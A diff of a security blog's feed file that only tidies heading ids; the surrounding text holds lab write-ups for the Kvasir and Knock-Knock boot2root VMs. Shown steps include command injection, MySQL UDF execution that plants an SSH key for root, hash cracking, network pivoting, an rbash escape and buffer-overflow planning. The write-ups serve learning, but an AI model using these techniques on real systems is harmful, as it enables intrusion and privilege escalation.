 &lt;p&gt;The day before the exam, I stocked up on some &lt;a href=&#34;https://twitter.com/leonjza/status/534967808619470849&#34;&gt;energy drinks&lt;/a&gt; and made sure I get a good nights sleep while trying to keep my mind off the exam until it was time.&lt;/p&gt;
@@ -5467,13 +5467,13 @@ more awesome boot2root VMs!
 
 &lt;p&gt;At about 6am that morning, I was up to 80 points. This is technically already enough to pass (assuming I did not make a mistake and break a rule), but I wanted to try get all of the points I could possibly get. Fast forward to about 9am that morning, I decided to call it and start getting a rough draft of the exam report ready. I wanted to make sure I had all of the screenshots and console output I needed before the VPN expired.&lt;/p&gt;
 
-&lt;h2 id=&#34;the-reports:6809ed4345dd0e9b990112bd7672048b&#34;&gt;the reports&lt;/h2&gt;
+&lt;h2 id=&#34;the-reports&#34;&gt;the reports&lt;/h2&gt;
 
 &lt;p&gt;At exactly 1045 that morning, the VPN dropped and the challenge was over. I now had 24 hours to submit the report. Considering I have been up for about 28 hours now (with a 1hour power nap), I thought it best to actually get some sleep and finish the report off afterwards.&lt;/p&gt;
 
 &lt;p&gt;After about 6 hours of ZZZ&amp;rsquo;s, I had a proper dinner and sat down to complete the exam report. The Lab report took me almost 2 weeks to complete, but the exam is nowhere near as much work and was definitely doable in 24hours. 10pm that evening I submitted both of my reports and went straight to bed :D&lt;/p&gt;
 
-&lt;h2 id=&#34;certification:6809ed4345dd0e9b990112bd7672048b&#34;&gt;certification&lt;/h2&gt;
+&lt;h2 id=&#34;certification&#34;&gt;certification&lt;/h2&gt;
 
 &lt;p&gt;Almost exactly 24 hours later, I get the confirmation email that I have passed:&lt;/p&gt;
 
@@ -5488,7 +5488,7 @@ more awesome boot2root VMs!
 
 &lt;p&gt;Dem feels were good :D&lt;/p&gt;
 
-&lt;h2 id=&#34;oscp-faq:6809ed4345dd0e9b990112bd7672048b&#34;&gt;oscp faq&lt;/h2&gt;
+&lt;h2 id=&#34;oscp-faq&#34;&gt;oscp faq&lt;/h2&gt;
 
 &lt;p&gt;I had quite a number of questions before I started the PWK training. So, let me try and answer a few for others that may have similar questions:&lt;/p&gt;
 
@@ -5523,7 +5523,7 @@ a: TRY HARDER.&lt;/p&gt;
       <guid>https://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/</guid>
       <description>
 
-&lt;h2 id=&#34;introduction:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;http://vulnhub.com/entry/kvasir-i,106/&#34;&gt;Kvasir&lt;/a&gt;, a boot2root by &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!&lt;/p&gt;
 
@@ -5540,7 +5540,7 @@ a: TRY HARDER.&lt;/p&gt;
 
 &lt;p&gt;This writeup details the path I took to read the final flag :)&lt;/p&gt;
 
-&lt;h2 id=&#34;a-usual-start:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;a usual start&lt;/h2&gt;
+&lt;h2 id=&#34;a-usual-start&#34;&gt;a usual start&lt;/h2&gt;
 
 &lt;p&gt;Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using &lt;code&gt;proxychains&lt;/code&gt;, and I was editing &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; to match the port of the proxy I needed to use to reach my desired destination.&lt;/p&gt;
 
@@ -5571,7 +5571,7 @@ MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)
 Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;fink-ur-gud-enuf:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;fink ur gud enuf?&lt;/h2&gt;
+&lt;h2 id=&#34;fink-ur-gud-enuf&#34;&gt;fink ur gud enuf?&lt;/h2&gt;
 
 &lt;p&gt;Browsing to the IP using Iceweasel, we see a login portal presented to us:&lt;/p&gt;
 
@@ -5664,7 +5664,7 @@ ID  Response   Lines      Word         Chars          Request
 
 &lt;p&gt;Woa, thats quite a bit of results to work through eh :)&lt;/p&gt;
 
-&lt;h2 id=&#34;admins-only-want-to-302-here:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;admins only want to 302 here&lt;/h2&gt;
+&lt;h2 id=&#34;admins-only-want-to-302-here&#34;&gt;admins only want to 302 here&lt;/h2&gt;
 
 &lt;p&gt;Of everything &lt;code&gt;wfuzz&lt;/code&gt; revealed to us, &lt;code&gt;admin.php&lt;/code&gt; was the most interesting one. Watching Burp as the requests went up and down, I noticed that &lt;code&gt;admin.php&lt;/code&gt; would return a HTTP 302 code with a location, along with an actual body:&lt;/p&gt;
 
@@ -5690,7 +5690,7 @@ ID  Response   Lines      Word         Chars          Request
 
 &lt;p&gt;The form hints that we can check the service status of daemons running on the underlying OS, and suggests &lt;code&gt;apache2&lt;/code&gt; as input. I submitted the form with &lt;code&gt;apache2&lt;/code&gt; as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section &lt;code&gt;Apache2 is running (pid 1330).&lt;/code&gt;. This just &lt;strong&gt;screams&lt;/strong&gt; command injection doesn’t it?&lt;/p&gt;
 
-&lt;h2 id=&#34;command-injection:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;command injection&lt;/h2&gt;
+&lt;h2 id=&#34;command-injection&#34;&gt;command injection&lt;/h2&gt;
 
 &lt;p&gt;In order for me to fuzz this further, I took the request to trusty &amp;lsquo;ol &lt;code&gt;curl&lt;/code&gt;. While doing this, I realized that &lt;code&gt;admin.php&lt;/code&gt; did no checks to ensure that we are authenticated or anything. We could simply submit &lt;code&gt;service=&amp;lt;payload&amp;gt;&lt;/code&gt; as a POST to &lt;code&gt;admin.php&lt;/code&gt; and get output:&lt;/p&gt;
 
@@ -5732,7 +5732,7 @@ print system(&amp;quot;/etc/init.d/&amp;quot; . $_POST[&amp;quot;service&amp;quo
 &amp;lt;/pre&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;netcat-is-our-entry-into-the-rabbit-hole:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;netcat is our entry into the rabbit hole&lt;/h2&gt;
+&lt;h2 id=&#34;netcat-is-our-entry-into-the-rabbit-hole&#34;&gt;netcat is our entry into the rabbit hole&lt;/h2&gt;
 
 &lt;p&gt;With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&amp;rsquo;d out. This ended up as the following python script:&lt;/p&gt;
 
@@ -5798,7 +5798,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 &lt;p&gt;The only public presence of the internal network is therefore the originally discovered &lt;strong&gt;192.168.56.102&lt;/strong&gt; IP address.&lt;/p&gt;
 
-&lt;h2 id=&#34;my-see-qual-as-root-deserves-a-slap-on-the-wrist:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;my-see-qual as root deserves a slap on the wrist&lt;/h2&gt;
+&lt;h2 id=&#34;my-see-qual-as-root-deserves-a-slap-on-the-wrist&#34;&gt;my-see-qual as root deserves a slap on the wrist&lt;/h2&gt;
 
 &lt;p&gt;With semi interactive shell access using &lt;code&gt;netcat&lt;/code&gt; to &lt;strong&gt;web&lt;/strong&gt; (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from &lt;code&gt;member.php&lt;/code&gt;:&lt;/p&gt;
 
@@ -5852,7 +5852,7 @@ webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
 
 &lt;p&gt;As a side note, further enumeration of the PHP sources and MySQL table &lt;code&gt;users&lt;/code&gt; showed that if we injected SQL on the registration page to add a extra &lt;code&gt;1&lt;/code&gt;, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.&lt;/p&gt;
 
-&lt;h3 id=&#34;cracking-root-s-mysql-password:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;cracking root&amp;rsquo;s MySQL password&lt;/h3&gt;
+&lt;h3 id=&#34;cracking-root-s-mysql-password&#34;&gt;cracking root&amp;rsquo;s MySQL password&lt;/h3&gt;
 
 &lt;p&gt;Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used &lt;code&gt;hashcat&lt;/code&gt; with the ever famous &lt;code&gt;rockyou&lt;/code&gt; wordlist:&lt;/p&gt;
 
@@ -5893,7 +5893,7 @@ Grants for root@192.168.2.100
 GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;192.168.2.100&#39; IDENTIFIED BY PASSWORD &#39;*ECB01D78C2FBEE997EDA584C647183FD99C115FD&#39; WITH GRANT OPTION
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;loading-the-udf-remotely:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;loading the UDF remotely&lt;/h3&gt;
+&lt;h3 id=&#34;loading-the-udf-remotely&#34;&gt;loading the UDF remotely&lt;/h3&gt;
 
 &lt;p&gt;With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.&lt;/p&gt;
 
@@ -5946,7 +5946,7 @@ sys_exec(&amp;quot;echo \&amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBK
 
 &lt;p&gt;The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of &lt;code&gt;0&lt;/code&gt;, indicating that it was successful. I specify the &lt;code&gt;timeout&lt;/code&gt; command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)&lt;/p&gt;
 
-&lt;h2 id=&#34;ssh-to-db-host:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;ssh to db host&lt;/h2&gt;
+&lt;h2 id=&#34;ssh-to-db-host&#34;&gt;ssh to db host&lt;/h2&gt;
 
 &lt;p&gt;With all that done, I have my public key for the &lt;code&gt;root&lt;/code&gt; user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I &lt;em&gt;get&lt;/em&gt; to 192.168.2.200&amp;rsquo;s port 22? :)&lt;/p&gt;
 
@@ -6030,7 +6030,7 @@ root@db:~#
 
 &lt;p&gt;8-)&lt;/p&gt;
 
-&lt;h2 id=&#34;not-exactly-nsa-level-spying-but-heh:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;not exactly nsa level spying but heh&lt;/h2&gt;
+&lt;h2 id=&#34;not-exactly-nsa-level-spying-but-heh&#34;&gt;not exactly nsa level spying but heh&lt;/h2&gt;
 
 &lt;p&gt;Initial enumeration revealed that this host (&lt;code&gt;db&lt;/code&gt;) had 2 network interfaces. One with IP &lt;strong&gt;192.168.2.200&lt;/strong&gt; (the one I came in from), and another with IP &lt;strong&gt;192.168.3.200&lt;/strong&gt;. There were also 2 entries in &lt;code&gt;/etc/hosts&lt;/code&gt; about 2 hosts in the 3.x network:&lt;/p&gt;
 
@@ -6145,7 +6145,7 @@ Last login: Thu Sep  4 09:20:00 2014
 celes@dev1:~$
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;finding-terras-secret:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;finding terras secret&lt;/h2&gt;
+&lt;h2 id=&#34;finding-terras-secret&#34;&gt;finding terras secret&lt;/h2&gt;
 
 &lt;p&gt;Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:&lt;/p&gt;
 
@@ -6198,7 +6198,7 @@ Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she
 &lt;/figure&gt;
 
 
-&lt;h3 id=&#34;getting-stepic-to-play-nice:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;getting stepic to play nice&lt;/h3&gt;
+&lt;h3 id=&#34;getting-stepic-to-play-nice&#34;&gt;getting stepic to play nice&lt;/h3&gt;
 
 &lt;p&gt;With the image ready, I searched for &lt;code&gt;stepic&lt;/code&gt; using &lt;code&gt;pip&lt;/code&gt; in my virtual env and installed it:&lt;/p&gt;
 
@@ -6246,7 +6246,7 @@ Cleaning up...
 
 &lt;p&gt;The final hack was to change the installed &lt;code&gt;stepic&lt;/code&gt; bin at &lt;code&gt;/root/kvasir/bin/stepic&lt;/code&gt; line 24 from &lt;code&gt;import Image&lt;/code&gt; to &lt;code&gt;from PIL import Image&lt;/code&gt;. Finally, &lt;code&gt;stepic&lt;/code&gt; was working fine.&lt;/p&gt;
 
-&lt;h3 id=&#34;finding-the-secret:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;finding the secret&lt;/h3&gt;
+&lt;h3 id=&#34;finding-the-secret&#34;&gt;finding the secret&lt;/h3&gt;
 
 &lt;p&gt;With &lt;code&gt;stepic&lt;/code&gt; up and running, I was finally able to run it against the image &lt;code&gt;kvasir.png&lt;/code&gt;:&lt;/p&gt;
 
@@ -6302,7 +6302,7 @@ kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
 
 &lt;p&gt;A QR code! I fetched my phone and scanned it, revealing the string &lt;code&gt;Nk9yY31hva8q&lt;/code&gt;. Great!&amp;hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for &lt;code&gt;dev1&lt;/code&gt; either.&lt;/p&gt;
 
-&lt;h2 id=&#34;playing-terra-s-game:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;playing Terra&amp;rsquo;s game&lt;/h2&gt;
+&lt;h2 id=&#34;playing-terra-s-game&#34;&gt;playing Terra&amp;rsquo;s game&lt;/h2&gt;
 
 &lt;p&gt;Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&amp;rsquo;s game as per the email. From the &lt;code&gt;/etc/hosts&lt;/code&gt; on &lt;code&gt;db&lt;/code&gt;, I saw a comment for &lt;code&gt;terra&lt;/code&gt; as &lt;strong&gt;192.168.3.50&lt;/strong&gt;. Using the SSH socks proxy on &lt;code&gt;tcp/8000&lt;/code&gt; I setup when I setup the SSH session to &lt;strong&gt;192.168.2.200&lt;/strong&gt;, I nmapped &lt;strong&gt;192.168.3.50&lt;/strong&gt;.&lt;/p&gt;
 
@@ -6524,7 +6524,7 @@ terra@dev2:~$
 &lt;/figure&gt;
 
 
-&lt;h2 id=&#34;letting-myself-in-via-the-back-door:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;letting myself in via the back door&lt;/h2&gt;
+&lt;h2 id=&#34;letting-myself-in-via-the-back-door&#34;&gt;letting myself in via the back door&lt;/h2&gt;
 
 &lt;p&gt;Enumerating &lt;code&gt;dev2&lt;/code&gt; did not reveal much interesting information. In fact, the most important clue found was in a mail for &lt;code&gt;terra&lt;/code&gt; from Locke:&lt;/p&gt;
 
@@ -6628,7 +6628,7 @@ uid=1000(locke) gid=1000(locke) groups=1000(locke)
 &lt;/figure&gt;
 
 
-&lt;h2 id=&#34;busting-kefka:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;busting kefka&lt;/h2&gt;
+&lt;h2 id=&#34;busting-kefka&#34;&gt;busting kefka&lt;/h2&gt;
 
 &lt;p&gt;The shell on &lt;code&gt;adm&lt;/code&gt; as &lt;code&gt;locke&lt;/code&gt; was nothing more than a &lt;code&gt;/bin/sh&lt;/code&gt; instance executed over &lt;code&gt;netcat&lt;/code&gt;. This can be seen in the &lt;code&gt;littleShell.sh&lt;/code&gt; file in &lt;code&gt;/home/locke&lt;/code&gt;:&lt;/p&gt;
 
@@ -6764,7 +6764,7 @@ kefka@adm:~$
 
 &lt;p&gt;A final &lt;code&gt;tcp/8002&lt;/code&gt; proxy was opened on my attacking machine.&lt;/p&gt;
 
-&lt;h2 id=&#34;taking-the-last-ride-to-the-flag:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;taking the last ride to the flag&lt;/h2&gt;
+&lt;h2 id=&#34;taking-the-last-ride-to-the-flag&#34;&gt;taking the last ride to the flag&lt;/h2&gt;
 
 &lt;p&gt;Enumeration as kefka revealed that this user is allowed to run &lt;code&gt;/opt/wep2.py&lt;/code&gt; as root. This is almost screaming at me as the privilege escalation path!&lt;/p&gt;
 
@@ -6822,7 +6822,7 @@ E A
 
 &lt;p&gt;&lt;em&gt;This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)&lt;/em&gt;&lt;/p&gt;
 
-&lt;h3 id=&#34;understanding-what-wep-actually-is:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;understanding what WEP actually is&lt;/h3&gt;
+&lt;h3 id=&#34;understanding-what-wep-actually-is&#34;&gt;understanding what WEP actually is&lt;/h3&gt;
 
 &lt;p&gt;With the limited interaction I have had with the last game, and the hint &lt;code&gt;wep2&lt;/code&gt;, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.&lt;/p&gt;
 
@@ -6844,7 +6844,7 @@ E A
 
 &lt;p&gt;My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&amp;rsquo;s, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the &lt;code&gt;2&lt;/code&gt; in &lt;code&gt;wep2&lt;/code&gt; was another troll :)&lt;/p&gt;
 
-&lt;h3 id=&#34;attacking-the-encryption-game:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;attacking the encryption game&lt;/h3&gt;
+&lt;h3 id=&#34;attacking-the-encryption-game&#34;&gt;attacking the encryption game&lt;/h3&gt;
 
 &lt;p&gt;Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.&lt;/p&gt;
 
@@ -6958,7 +6958,7 @@ ProxyChains-3.1 (http://proxychains.sf.net)
 
 &lt;p&gt;&lt;code&gt;0W6U6vwG4W1V&lt;/code&gt;. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&amp;hellip; bed time for me!!&lt;/p&gt;
 
-&lt;h2 id=&#34;finally-getting-the-flag-sort-of:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;finally getting the flag, sort of&amp;hellip;&lt;/h2&gt;
+&lt;h2 id=&#34;finally-getting-the-flag-sort-of&#34;&gt;finally getting the flag, sort of&amp;hellip;&lt;/h2&gt;
 
 &lt;p&gt;I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.&lt;/p&gt;
 
@@ -7067,7 +7067,7 @@ Last login: Sun Nov  9 16:57:16 2014 from localhost
 root@adm:~#
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;the-final-troll:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;the final troll&lt;/h2&gt;
+&lt;h2 id=&#34;the-final-troll&#34;&gt;the final troll&lt;/h2&gt;
 
 &lt;p&gt;With the &lt;code&gt;/root/flag&lt;/code&gt; in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with &lt;code&gt;decode()&lt;/code&gt; again:&lt;/p&gt;
 
@@ -7101,7 +7101,7 @@ http://wi-fu.co.uk, #VulnHub IRC or Twitter.
 &amp;gt;&amp;gt;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;conclusion:8e60d26162acdf38cf8b59710b011a9b&#34;&gt;conclusion&lt;/h2&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;
 
 &lt;p&gt;Wow. I actually can&amp;rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!&lt;/p&gt;
 
@@ -7117,7 +7117,7 @@ http://wi-fu.co.uk, #VulnHub IRC or Twitter.
       <guid>https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/</guid>
       <description>
 
-&lt;h2 id=&#34;introduction:1122ba630e8da20bb861d870e35485fa&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;http://vulnhub.com/series/knock-knock,53/&#34;&gt;Knock-Knock&lt;/a&gt; is a vulnerable boot2root VM by &lt;a href=&#34;https://twitter.com/zer0w1re&#34;&gt;@zer0w1re&lt;/a&gt; and sure as heck was packed with interesting twists and things to learn!&lt;/p&gt;
 
@@ -7134,7 +7134,7 @@ This is my experience &amp;lsquo;knocking&amp;rsquo; on the door.&lt;/p&gt;
 &lt;p&gt;“Theodore wasn&amp;rsquo;t open so I knocked”&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h2 id=&#34;getting-started:1122ba630e8da20bb861d870e35485fa&#34;&gt;getting started&lt;/h2&gt;
+&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;
 
 &lt;p&gt;As always, the vm&amp;rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched &lt;code&gt;arp&lt;/code&gt; for any new entries. This presented the first hurdle. A ping scan showed no new IP&amp;rsquo;s in the network range my VM&amp;rsquo;s were in (192.168.56.0/24):&lt;/p&gt;
 
@@ -7216,7 +7216,7 @@ Service detection performed. Please report any incorrect results at http://nmap.
 Nmap done: 1 IP address (1 host up) scanned in 5521.11 seconds
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;knock-knock:1122ba630e8da20bb861d870e35485fa&#34;&gt;knock knock&amp;hellip;&lt;/h2&gt;
+&lt;h2 id=&#34;knock-knock&#34;&gt;knock knock&amp;hellip;&lt;/h2&gt;
 
 &lt;p&gt;&lt;code&gt;tcp/1337&lt;/code&gt; was the only open port on the machine. I promptly connected to it to see what we have:&lt;/p&gt;
 
@@ -7237,7 +7237,7 @@ root@kali:~# nc -vn 192.168.56.203 1337
 
 &lt;p&gt;This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.&lt;/p&gt;
 
-&lt;h2 id=&#34;whos-there:1122ba630e8da20bb861d870e35485fa&#34;&gt;&amp;hellip;whos there?&lt;/h2&gt;
+&lt;h2 id=&#34;whos-there&#34;&gt;&amp;hellip;whos there?&lt;/h2&gt;
 
 &lt;p&gt;So with the &lt;code&gt;tcp/1337&lt;/code&gt; service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using &lt;code&gt;nmap&lt;/code&gt; to scan them:&lt;/p&gt;
 
@@ -7274,7 +7274,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
 
 &lt;p&gt;Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.&lt;/p&gt;
 
-&lt;h2 id=&#34;22-and-80-too:1122ba630e8da20bb861d870e35485fa&#34;&gt;22 and 80 too&lt;/h2&gt;
+&lt;h2 id=&#34;22-and-80-too&#34;&gt;22 and 80 too&lt;/h2&gt;
 
 &lt;p&gt;The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the &lt;code&gt;tcp/1337&lt;/code&gt; service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:&lt;/p&gt;
 
@@ -7377,7 +7377,7 @@ if __name__ == &#39;__main__&#39;:
 
 &lt;p&gt;I know that I could test to see if say &lt;code&gt;tcp/22&lt;/code&gt; was open, but I went with the assumption that you don&amp;rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.&lt;/p&gt;
 
-&lt;h2 id=&#34;may-i-burn-the-door-now:1122ba630e8da20bb861d870e35485fa&#34;&gt;may I burn the door now?&lt;/h2&gt;
+&lt;h2 id=&#34;may-i-burn-the-door-now&#34;&gt;may I burn the door now?&lt;/h2&gt;
 
 &lt;p&gt;So, focus shifted to the web server at &lt;code&gt;tcp/80&lt;/code&gt;. Browsing to the web server presented us with the following:&lt;/p&gt;
 
@@ -7475,7 +7475,7 @@ sax2Cw9Ow
 
 &lt;p&gt;Hah! Login Credentials sound very promising!! :)&lt;/p&gt;
 
-&lt;h2 id=&#34;ceasar-opens-the-door:1122ba630e8da20bb861d870e35485fa&#34;&gt;ceasar opens the door&lt;/h2&gt;
+&lt;h2 id=&#34;ceasar-opens-the-door&#34;&gt;ceasar opens the door&lt;/h2&gt;
 
 &lt;p&gt;After finding the hidden strings in the jpeg, I came to a quick realization that &lt;code&gt;abfnW:sax2Cw9Ow&lt;/code&gt; was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.&lt;/p&gt;
 
@@ -7522,7 +7522,7 @@ Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
 jason@knockknock:~$
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;no-rbash-just-no:1122ba630e8da20bb861d870e35485fa&#34;&gt;no rbash, just no&lt;/h2&gt;
+&lt;h2 id=&#34;no-rbash-just-no&#34;&gt;no rbash, just no&lt;/h2&gt;
 
 &lt;p&gt;Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:&lt;/p&gt;
 
@@ -7532,7 +7532,7 @@ jason@knockknock:~$
 
 &lt;p&gt;Rbash? Oh well thats ok. I checked by inspecting the env var for &lt;code&gt;SHELL&lt;/code&gt; which was &lt;code&gt;/bin/rbash&lt;/code&gt; just to confirm. Thanks to having recently met a similar situation during the &lt;a href=&#34;https://leonjza.github.io/blog/2014/09/18/from-persistence/&#34;&gt;Persistence&lt;/a&gt; boot2root and learning new ways of breaking out of &lt;code&gt;rbash&lt;/code&gt;, I just typed &lt;code&gt;nice /bin/bash&lt;/code&gt;, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full &lt;code&gt;bash&lt;/code&gt; shell.&lt;/p&gt;
 
-&lt;h2 id=&#34;tiny-file-crypter:1122ba630e8da20bb861d870e35485fa&#34;&gt;tiny file crypter&lt;/h2&gt;
+&lt;h2 id=&#34;tiny-file-crypter&#34;&gt;tiny file crypter&lt;/h2&gt;
 
 &lt;p&gt;Some quick initial enumeration did not reveal anything particularly interesting. In &lt;code&gt;jason&lt;/code&gt;&amp;rsquo;s home folder though was a file called &lt;code&gt;tfc&lt;/code&gt;:&lt;/p&gt;
 
@@ -7599,7 +7599,7 @@ This is a test document.
 
 &lt;p&gt;But ok. That actually means nothing now. It also definitely does not tell us how to break &lt;code&gt;tfc&lt;/code&gt; either!&lt;/p&gt;
 
-&lt;h2 id=&#34;fuzzing-disassembling-tfc:1122ba630e8da20bb861d870e35485fa&#34;&gt;fuzzing &amp;amp; disassembling tfc&lt;/h2&gt;
+&lt;h2 id=&#34;fuzzing-disassembling-tfc&#34;&gt;fuzzing &amp;amp; disassembling tfc&lt;/h2&gt;
 
 &lt;p&gt;With all of the information gathered thus far about &lt;code&gt;tfc&lt;/code&gt;, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override &lt;code&gt;/etc/shadow&lt;/code&gt; to replace &lt;code&gt;root&lt;/code&gt;s password, or replace &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the &lt;code&gt;.tfc&lt;/code&gt; extension.&lt;/p&gt;
 
@@ -7687,7 +7687,7 @@ RELRO     : disabled
 
 &lt;p&gt;Woa. &lt;strong&gt;No&lt;/strong&gt; security? Ok&amp;hellip;&lt;/p&gt;
 
-&lt;h2 id=&#34;we-knocked-and-tfc-opened-the-door-to-bof:1122ba630e8da20bb861d870e35485fa&#34;&gt;we knocked and tfc opened the door to bof&lt;/h2&gt;
+&lt;h2 id=&#34;we-knocked-and-tfc-opened-the-door-to-bof&#34;&gt;we knocked and tfc opened the door to bof&lt;/h2&gt;
 
 &lt;p&gt;The disassembly of &lt;code&gt;tfc&lt;/code&gt; did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)&lt;/p&gt;
 
@@ -7755,7 +7755,7 @@ gdb-peda$
 
 &lt;p&gt;Ow. Ok, so we don&amp;rsquo;t crash with a clean &lt;em&gt;0x41414141&lt;/em&gt; as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.&lt;/p&gt;
 
-&lt;h2 id=&#34;planning-a-exploit:1122ba630e8da20bb861d870e35485fa&#34;&gt;planning a exploit&lt;/h2&gt;
+&lt;h2 id=&#34;planning-a-exploit&#34;&gt;planning a exploit&lt;/h2&gt;
 
 &lt;p&gt;So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs &lt;strong&gt;after&lt;/strong&gt; the encryption function (remember &lt;code&gt;xcrypt&lt;/code&gt;?) has run and wants to write the output to file (this is an assumption though).&lt;/p&gt;
 
@@ -7767,7 +7767,7 @@ gdb-peda$
 
 &lt;p&gt;Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in &lt;code&gt;xcrypt()&lt;/code&gt; to get started. Something I have practically 0 experience in.&lt;/p&gt;
 
-&lt;h2 id=&#34;reversing-xcrypt:1122ba630e8da20bb861d870e35485fa&#34;&gt;reversing xcrypt()&lt;/h2&gt;
+&lt;h2 id=&#34;reversing-xcrypt&#34;&gt;reversing xcrypt()&lt;/h2&gt;
 
